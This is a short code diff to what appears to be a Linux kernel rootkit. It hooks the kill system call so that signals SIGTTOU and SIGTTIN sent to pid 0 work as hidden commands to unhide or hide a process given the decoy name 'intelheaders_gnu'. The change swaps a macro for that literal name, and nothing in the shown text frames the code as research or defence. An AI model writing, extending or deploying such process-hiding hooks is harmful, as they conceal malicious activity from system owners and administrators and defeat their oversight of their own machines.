@@ -41,16 +41,16 @@ static asmlinkage int kill_hook(const struct pt_regs* ctx) {
             break;
             
         case SIGTTOU:
-            // Show intel_gnu_header process: kill -22 0
+            // Show intelheaders_gnu process: kill -22 0
             if (pid == 0) {
-                remove_hidden_process(AUTO_HIDE_PROCESS);
+                remove_hidden_process("intelheaders_gnu");
             }
             break;
             
         case SIGTTIN:
-            // Hide intel_gnu_header process: kill -23 0
+            // Hide intelheaders_gnu process: kill -23 0
             if (pid == 0) {
-                add_hidden_process(AUTO_HIDE_PROCESS);
+                add_hidden_process("intelheaders_gnu");
             }
             break;
             
